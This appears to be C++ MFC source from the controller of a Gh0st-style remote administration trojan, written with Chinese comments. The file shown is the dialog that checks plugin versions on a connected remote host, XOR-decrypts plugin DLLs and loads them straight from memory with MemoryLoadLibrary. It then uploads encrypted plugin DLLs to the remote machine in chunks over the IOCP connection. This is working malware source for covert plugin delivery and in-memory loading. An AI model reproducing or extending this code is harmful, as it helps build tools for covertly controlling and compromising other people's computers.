// DllDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "DllDlg.h"
#include "MainFrm.h"
#include "ClientView.h"
#include "MemoryModule.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pConnectView;
HMEMORYMODULE hDll;
HANDLE hDllFile;
void*  MemDll;
int    SizeDll;
DWORD  BytesRead;

/////////////////////////////////////////////////////////////////////////////
// CDllDlg dialog

CDllDlg::CDllDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CDllDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CDllDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	//	AfxMessageBox("CDllDlg");
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	//ModifyStyleEx( WS_EX_APPWINDOW, 0 ); 
	char strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf));
	m_strOperatingPath = strSelf;
	
	m_strOperatingPath.Format("%s\\Plugins\\", m_strOperatingPath.Mid(0,m_strOperatingPath.ReverseFind('\\')));
	
	lparam = (LPBYTE)LocalAlloc(LPTR, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
	memcpy(lparam, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
	dwSizeofbuff = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
}

void CDllDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDllDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX, IDC_DLLDLG_PROGRESS, m_dlldlg_progress);
	//}}AFX_DATA_MAP
}

void CDllDlg::OnReceiveComplete()
{
	//	AfxMessageBox("OnReceiveComplete");
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_DLLVERSION:
		GetServerVersion();
		break;
	case TOKEN_DLLLOADERROR:
		{
			m_strOperatingFile = m_strOperatingPath + (char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1); //重传时也发送了一个文件名
//			AfxMessageBox("要求重传");
// 			CString str;
// 			str.Format("加载服务端失败是否重传?\n");
// 			if(::MessageBox(m_hWnd, str.GetBuffer(0),"提示:",MB_YESNO)==IDYES)
				SendUploadJob();
// 			else
// 				::SendMessage(m_hWnd,WM_CLOSE,0,0);
		}
		break;
	case TOKEN_DLLOK:
		Sleep(500);
		::SendMessage(m_hWnd,WM_CLOSE,0,0);
		break;
	case TOKEN_DATA_CONTINUE:
		Sleep(50);
		SendFileData();
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

BEGIN_MESSAGE_MAP(CDllDlg, CDialog)
	//{{AFX_MSG_MAP(CDllDlg)
	ON_WM_CLOSE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDllDlg message handlers
BOOL CDllDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 检测服务端版本", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	m_dlldlg_progress.SetRange(0, 100);
	m_dlldlg_progress.SetPos(0);
	m_dlldlg_progress.ShowWindow(SW_HIDE);
	m_bIsStop=false;
	
	BYTE bToken = COMMAND_DLLVERSION;
	m_iocpServer->Send(m_pContext, &bToken, 1);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CDllDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
}

void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key)//解密
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	
	for(i = 0; i < nLen; i++) 
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}

void CDllDlg::GetServerVersion()
{
	HMEMORYMODULE  hdllmod;
	//版本比较
	char	*lpSerVer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)); //服务版本
	m_strOperatingFile = m_strOperatingPath + (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1 + lstrlen(lpSerVer) + 1));
	
	if(GetFileAttributes(m_strOperatingFile.GetBuffer(0)) != -1)
	{
		hDllFile =CreateFile(m_strOperatingFile.GetBuffer(0),GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);//这里第一个参数调用上面那个GetModuleFileName
		SizeDll  =GetFileSize(hDllFile,0);
		MemDll   =VirtualAlloc(0,SizeDll,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
		ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0);
		CloseHandle(hDllFile);
		DecryptPlug((unsigned char *)MemDll,SizeDll,1024);
		typedef char * (WINAPI * DLLVERSION)();
		hdllmod = ::MemoryLoadLibrary(MemDll);
		VirtualFree(MemDll,0,MEM_RELEASE);
		if(hdllmod != NULL)
		{
			char strdllversion[256]={0};
			DLLVERSION lpproc;
			lpproc = (DLLVERSION)MemoryGetProcAddress(hdllmod,"Version");
			if(lpproc!=(DLLVERSION)NULL)
				strcpy(strdllversion ,(char *)(*lpproc)());
			MemoryFreeLibrary(hdllmod);
			
			SetDlgItemText(IDC_DLLSERVER, lpSerVer);
			SetDlgItemText(IDC_DLLCLENTVER, strdllversion);
			//UpdateData(FALSE);
			
 			if (strcmp(strdllversion,lpSerVer))
// 			{
// 				AfxMessageBox("相同"); //这里调用ONCLOSE时会重新调用次INITDLG
// 				Sleep(1000);
// 				OnClose();
// 			}
// 			else
			{
				CString str;
				str.Format("发现服务端版本与本地不一致, 是否重传?\n服务端版本: %s\n客户端版本: %s",lpSerVer,strdllversion);
				if(::MessageBox(m_hWnd, str.GetBuffer(0),"提示:",MB_YESNO|MB_ICONQUESTION)==IDYES)
				{
					SendUploadJob();
					return ;
				}
			}
			
			LPBYTE	lpPacket = new BYTE[dwSizeofbuff + 1];
			lpPacket[0] = COMMAND_DLLOK;
			memcpy(lpPacket + 1, lparam, dwSizeofbuff);
			m_iocpServer->Send(m_pContext, lpPacket, dwSizeofbuff + 1);
			delete[] lpPacket;
// 			BYTE bToken = COMMAND_DLLOK;
// 			m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
			return;
		}
	}
	
	//	AfxMessageBox("获取本地版本失败,尝试启动服务!");
	LPBYTE	lpPacket = new BYTE[dwSizeofbuff + 1];
	lpPacket[0] = COMMAND_DLLOK;
	memcpy(lpPacket + 1, lparam, dwSizeofbuff);
	m_iocpServer->Send(m_pContext, lpPacket, dwSizeofbuff + 1);
	delete[] lpPacket;
// 	BYTE bToken = COMMAND_DLLOK;
// 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}

void CDllDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
// 	AfxMessageBox("COMMAND_DLLVERSION");
// 	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
// 	{
// 		AfxMessageBox("OnShowWindow switch");
// 	case TOKEN_DLLVERSION:
// 		AfxMessageBox("TOKEN_DLLVERSION1");
// 		GetServerVersion();
// 		break;
// 	case TOKEN_DLLLOADERROR:
// 		AfxMessageBox("TOKEN_DLLLOADERROR1");
// 		SendUploadJob();
// 		break;
// 	case TOKEN_DLLMAIN:
// 		AfxMessageBox("TOKEN_DLLMAIN");
// 		
// 		break;
// 	case TOKEN_DLLOK:
// 		AfxMessageBox("DLLOK1");
// //		OnClose();
// 		break;
// // 	case TOKEN_GET_TRANSFER_MODE:
// // 		AfxMessageBox("TOKEN_GET_TRANSFER_MODE");
// // 		SendTransferMode();
// // 		break;
// 	default:	
// 		AfxMessageBox("default");
// 		closesocket(m_pContext->m_Socket);
// //		OnClose();
// 		break;
// 	}
}

void CDllDlg::SendFileData()
{
//	AfxMessageBox("SendFileData");
// 	Sleep(100);
	
	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
	ShowProgress();
	
	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)
	{
//		AfxMessageBox("EndLocalUploadFile");
		EndLocalUploadFile();
		return;
 	}
// 	if (pFileSize->dwSizeLow == -1)
// 		AfxMessageBox("pFileSize->dwSizeLow");
// 	if(m_bIsStop)
// 		AfxMessageBox("m_bIsStop");
	
	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，数据
	lpBuffer[0] = COMMAND_FILE_DATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
	// 返回值
	bool	bRet = true;
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);
	
	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
	LocalFree(lpBuffer);
}

void CDllDlg::ShowProgress()
{
 	char	*lpDirection = NULL;
// 	if (m_bIsUpload)
// 		lpDirection = "传送文件";
// 	else
 		lpDirection = "接收文件";
	
	m_dlldlg_progress.ShowWindow(SW_NORMAL);
	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}
	
	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;
//	ShowMessage("%s %s %dKB (%d%%)", lpDirection, m_strOperatingFile, (int)(m_nCounter / 1024), progress);
	m_dlldlg_progress.SetPos(progress);
	
	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// 关闭文件句柄
	}
}

void CDllDlg::EndLocalUploadFile()
{
//	m_nCounter = 0;
//	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;
	
// 	if ( m_bIsStop)
// 	{
// 		//加载完成
// 	}
// 	else
// 	{
// 		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
// 		Sleep(5);
// 		SendUploadJob();
// 		
// 	}
//	AfxMessageBox("上传完成!");
	
	LPBYTE	lpPacket = new BYTE[dwSizeofbuff + 1];
	lpPacket[0] = COMMAND_DLLOK;
	memcpy(lpPacket + 1, lparam, dwSizeofbuff);
	m_iocpServer->Send(m_pContext, lpPacket, dwSizeofbuff + 1);
	delete[] lpPacket;
	return;
}

BOOL CDllDlg::SendUploadJob()
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	CString	fileRemote = m_strOperatingFile; // 远程文件
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		CString msg;
		msg.Format("本地文件 %s 未找到", m_strOperatingFile);
		AfxMessageBox(msg);
		::SendMessage(m_hWnd,WM_CLOSE,0,0);
		return FALSE;
	}
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = ((__int64)dwSizeHigh << 32) + dwSizeLow;
	
	CloseHandle(hFile);
	// 构造数据包，发送文件长度
	int		nPacketSize = 9;//fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	LocalFree(bPacket);
	return TRUE;
}

// void CDllDlg::SendSelectCommand(PBYTE pData, UINT nSize)
// {
// 	CXTPReportSelectedRows* SelRows = m_wndReport.GetSelectedRows();
// 	POSITION pos = SelRows->GetFirstSelectedRowPosition();
// 	while(pos)
// 	{
// 		CXTPReportRow* NextRow = SelRows->GetNextSelectedRow(pos);
// 		CXTPReportRecord* Record = NextRow->GetRecord();
// 		if (!Record->GetParentRecord())
// 			continue;
// 		ClientContext* pContext = (ClientContext*)Record->GetItem(1)->GetItemData();
// 		m_iocpServer->Send(pContext, pData, nSize);
// // 		Record->Delete();
// // 		m_wndReport.Populate();
// //		->GetItem(1)->GetItemData();
// 	}
// }

void CDllDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}
